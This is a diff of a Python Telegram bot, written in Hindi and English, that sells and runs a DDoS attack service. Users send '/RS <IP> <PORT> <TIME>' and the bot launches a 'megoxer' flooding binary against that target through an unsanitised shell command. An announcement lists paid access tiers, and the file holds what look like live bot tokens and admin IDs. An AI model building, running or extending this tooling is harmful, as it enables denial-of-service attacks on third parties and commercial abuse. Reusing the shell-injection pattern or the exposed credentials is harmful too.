@@ -1,117 +1,25 @@
 #!/usr/bin/python3
 import telebot
-import datetime
 import time
+import datetime
 import subprocess
 import threading
-from telebot import types
+import pytz
+import os
 
-# TELEGRAM BOT TOKEN
-bot = telebot.TeleBot('8048715452:AAGOOIM0peB8Tb6JcFQA_9rCcdmT9FamdrY')
+# ✅ TELEGRAM BOT TOKEN
+bot = telebot.TeleBot('8111473127:AAERRgnT8TW3fAw_cf_E2FM5zD8j4ae10k8')
 
-# GROUP AND CHANNEL DETAILS
+# ✅ GROUP AND ADMIN DETAILS
 GROUP_ID = "-1002369239894"
-CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
+ADMINS = ["7129010361"]
 SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
-ADMINS = [7129010361]
 
-# GLOBAL VARIABLES
-is_attack_running = False
-attack_end_time = None
-pending_feedback = {}
-warn_count = {}
-attack_logs = []
-user_attack_count = {}
+# ✅ Timezone सेट (IST)
+IST = pytz.timezone('Asia/Kolkata')
 
-# FUNCTION TO CHECK IF USER IS IN CHANNEL
-def is_user_in_channel(user_id):
-    try:
-        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
-        return member.status in ['member', 'administrator', 'creator']
-    except:
-        return False
-
-# SCREENSHOT VERIFICATION FUNCTION
-def verify_screenshot(user_id, message):
-    if user_id in pending_feedback:
-        bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
-        bot.send_message(SCREENSHOT_CHANNEL, f"📸 **FREE*USER `{user_id}` KA SCREENSHOT VERIFIED!** ✅")
-        bot.reply_to(message, f"📸 **FREE*USER `{user_id}` KA SCREENSHOT VERIFIED!** ✅")
-        del pending_feedback[user_id]  
-    else:
-        bot.reply_to(message, "❌ AB SCREENSHOT BHEJNE KI ZAROORAT NAHI HAI!")
-
-# HANDLE ATTACK COMMAND
-@bot.message_handler(commands=['RS'])
-def handle_attack(message):
-    global is_attack_running, attack_end_time
-    user_id = message.from_user.id
-    command = message.text.split()
-
-    if message.chat.id != int(GROUP_ID):
-        bot.reply_to(message, "🚫 YE BOT SIRF GROUP ME CHALEGA! ❌")
-        return
-
-    if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"❗ PEHLE CHANNEL JOIN KAR! {CHANNEL_USERNAME}")
-        return
-
-    if pending_feedback.get(user_id, False):
-        bot.reply_to(message, "PEHLE SCREENSHOT BHEJ, WARNA NAYA ATTACK NAHI MILEGA! 😡")
-        return
-
-    if is_attack_running:
-        bot.reply_to(message, "⚠️ EK ATTACK ALREADY CHAL RAHA HAI! CHECK KAR SAKTE HO /check !")
-        return
-
-    if len(command) != 4:
-        bot.reply_to(message, "⚠️ USAGE: /RS <IP> <PORT> <TIME>")
-        return
-
-    target, port, time_duration = command[1], command[2], command[3]
-
-    try:
-        port = int(port)
-        time_duration = int(time_duration)
-    except ValueError:
-        bot.reply_to(message, "❌ PORT AUR TIME NUMBER HONE CHAHIYE!")
-        return
-
-    if time_duration > 120:
-        bot.reply_to(message, "🚫 120S SE ZYADA ALLOWED NAHI HAI!")
-        return
-
-    confirm_msg = f"🔥 ATTACK DETAILS:\n🎯 TARGET: `{target}`\n🔢 PORT: `{port}`\n⏳ DURATION: `{time_duration}S`\nSTATUS: `CHAL RAHA HAI...`\n📸 ATTACK KE BAAD SCREENSHOT BHEJNA ZAROORI HAI!"
-
-    bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
-
-    # PIN ATTACK STATUS
-    bot.pin_chat_message(message.chat.id, message.message_id)
-
-    is_attack_running = True
-    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
-    pending_feedback[user_id] = True  
-
-    bot.send_message(message.chat.id, f"🚀 ATTACK SHURU!\n🎯 `{target}:{port}`\n⏳ {time_duration}S\nBETA SCREENSHOT BHEJ AB", parse_mode="Markdown")
-
-    # Attack Execution
-    try:
-        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
-    except subprocess.TimeoutExpired:
-        bot.reply_to(message, "❌ ATTACK TIMEOUT HO GAYA! 🚨")
-    except subprocess.CalledProcessError:
-        bot.reply_to(message, "❌ ATTACK FAIL HO GAYA!")
-    finally:
-        is_attack_running = False
-        attack_end_time = None  
-        bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
-
-        # UNPIN ATTACK STATUS
-        bot.unpin_chat_message(message.chat.id)
-
-        # ATTACK LOGS
-        attack_logs.append(f"{user_id} -> {target}:{port} ({time_duration}s)")
-        user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
+# ✅ Active Attacks को Track करने वाला Dictionary  
+active_attacks = {}
 
 # AUTO ANNOUNCEMENT SYSTEM
 def auto_announcement():
@@ -124,8 +32,8 @@ CHIPSET PRIZE
 1 HOURS -💸15  
 1 DAYS  - 💸60  
 2 DAYS  - 💸100  
-5 DAYS  - 💸220  
-7 DAYS  - 💸300  
+5 DAYS  - 💸240  
+7 DAYS  - 💸330  
 
 PAID GROUP LINK  
 👇👇👇  
@@ -139,58 +47,104 @@ DM - @R_SDanger
 🔥🔥🔥🔥🔥🔥 ! 🚀
 """)
 
-# HANDLE SCREENSHOT SUBMISSION
+
+# ✅ /START Command (Welcome)
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    user = message.from_user
+    first_name = user.first_name if user.first_name else "User"
+    bot.send_message(message.chat.id, f"👋 **WELCOME, {first_name}!**\nतुम्हारा अटैक तभी लगेगा जब तुम स्क्रीनशॉट दोगे!", parse_mode="Markdown")
+
+# ✅ FIXED: SCREENSHOT SYSTEM (अब Screenshot देना ज़रूरी है)
 @bot.message_handler(content_types=['photo'])
 def handle_screenshot(message):
     user_id = message.from_user.id
-    verify_screenshot(user_id, message)
+    file_id = message.photo[-1].file_id
 
-# ADMIN RESTART COMMAND (ONLY ADMINS)
-@bot.message_handler(commands=['restart'])
-def restart_bot(message):
-    if message.from_user.id in ADMINS:
-        bot.send_message(message.chat.id, "♻️ BOT RESTART HO RAHA HAI...")
-        time.sleep(1)
-        subprocess.run("python3 m.py", shell=True)
-    else:
-        bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")
+    caption_text = f"📸 **USER SCREENSHOT RECEIVED!**\n👤 **User ID:** `{user_id}`\n✅ **Forwarded to Admins!**"
+    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=caption_text, parse_mode="Markdown")
+    
+    bot.reply_to(message, "✅ SCREENSHOT FORWARDED! अब तुम अटैक कर सकते हो!")
 
-# HANDLE CHECK COMMAND
+    # ✅ स्क्रीनशॉट देने वाले यूज़र को अटैक करने की इजाजत दो
+    active_attacks[user_id] = []
+
+# ✅ /RS Attack Command (अब एक समय में सिर्फ 1 अटैक)
+@bot.message_handler(commands=['RS'])
+def handle_attack(message):
+    user_id = str(message.from_user.id)
+    chat_id = str(message.chat.id)
+
+    if chat_id != GROUP_ID:
+        bot.reply_to(message, "❌ YOU CAN USE THIS COMMAND ONLY IN THE ATTACK GROUP!")
+        return
+
+    if user_id not in active_attacks:
+        bot.reply_to(message, "❌ SCREENSHOT BHEJ BSDK, TABHI ATTACK LAGEGA!")
+        return
+
+    if len(active_attacks[user_id]) >= 1:
+        bot.reply_to(message, "❌ MAXIMUM 1 ATTACK ALLOWED AT A TIME! पहले अटैक खत्म होने दो।")
+        return
+
+    command = message.text.split()
+    if len(command) != 4:
+        bot.reply_to(message, "⚠ USAGE: /RS <IP> <PORT> <TIME>")
+        return
+
+    target, port, time_duration = command[1], command[2], command[3]
+
+    try:
+        port = int(port)
+        time_duration = int(time_duration)
+    except ValueError:
+        bot.reply_to(message, "❌ PORT AND TIME MUST BE NUMBERS!")
+        return
+
+    if time_duration > 240:
+        bot.reply_to(message, "🚫 MAX ATTACK TIME IS 240 SECONDS!")
+        return
+
+    end_time = datetime.datetime.now(IST) + datetime.timedelta(seconds=time_duration)
+    active_attacks[user_id].append((target, port, end_time))
+
+    bot.reply_to(message, f"🔥 ATTACK STARTED!\n🎯 TARGET: {target}\n🔢 PORT: {port}\n⏳ DURATION: {time_duration}s")
+
+    def attack_execution():
+        try:
+            subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
+        except subprocess.TimeoutExpired:
+            bot.reply_to(message, "❌ ATTACK TIMEOUT!")
+        except subprocess.CalledProcessError:
+            bot.reply_to(message, "❌ ATTACK FAILED!")
+
+        # ✅ अटैक खत्म होते ही लिस्ट से हटा दो
+        active_attacks[user_id] = []
+
+    threading.Thread(target=attack_execution).start()
+
+# ✅ /STATS Command - Shows Only Active Attacks
 @bot.message_handler(commands=['check'])
-def check_status(message):
-    if is_attack_running:
-        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
-        bot.reply_to(message, f"✅ **ATTACK CHAL RAHA HAI!**\n⏳ **BACHI HUI TIME:** {int(remaining_time)}S")
-    else:
-        bot.reply_to(message, "❌ KOI ATTACK ACTIVE NAHI HAI!")
-
-# ATTACK STATS SYSTEM
-@bot.message_handler(commands=['stats'])
 def attack_stats(message):
-    stats_msg = "📊 **ATTACK STATS:**\n\n"
-    for user, count in user_attack_count.items():
-        stats_msg += f"👤 `{user}` ➝ {count} ATTACKS 🚀\n"
-    bot.send_message(message.chat.id, stats_msg, parse_mode="Markdown")
-
-# HANDLE WARN SYSTEM
-@bot.message_handler(commands=['warn'])
-def warn_user(message):
-    if message.from_user.id not in ADMINS:
+    if not active_attacks:
+        bot.reply_to(message, "📊 No Active Attacks Right Now!")
         return
 
-    if not message.reply_to_message:
-        bot.reply_to(message, "❌ KISI KO WARN KARNE KE LIYE USKE MESSAGE PE REPLY KARO!")
-        return
+    now = datetime.datetime.now(IST)
+    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"
 
-    user_id = message.reply_to_message.from_user.id
-    warn_count[user_id] = warn_count.get(user_id, 0) + 1
+    for user_id, attacks in active_attacks.items():
+        if attacks:
+            stats_message += f"👤 **User ID:** `{user_id}`\n"
+            for target, port, end_time in attacks:
+                remaining_time = (end_time - now).total_seconds()
+                stats_message += f"🚀 **Target:** `{target}`\n🎯 **Port:** `{port}`\n⏳ **Ends In:** `{int(remaining_time)}s`\n\n"
 
-    if warn_count[user_id] >= 3:
-        bot.kick_chat_member(GROUP_ID, user_id)
-        bot.send_message(GROUP_ID, f"🚫 **USER {user_id} KO 3 WARN MIL CHUKE THE, ISLIYE BAN KAR DIYA GAYA!**")
-    else:
-        bot.send_message(GROUP_ID, f"⚠️ **USER {user_id} KO WARNING {warn_count[user_id]}/3 DI GAYI HAI!**")
+    bot.reply_to(message, stats_message, parse_mode="Markdown")
 
-# START POLLING
-threading.Thread(target=auto_announcement).start()
-bot.polling(none_stop=True)
+while True:
+    try:
+        bot.polling(none_stop=True, interval=0)
+    except Exception as e:
+        print(f"Polling Error: {e}")
+        time.sleep(5)  # कुछ सेकंड wait करके फिर से start करेगा
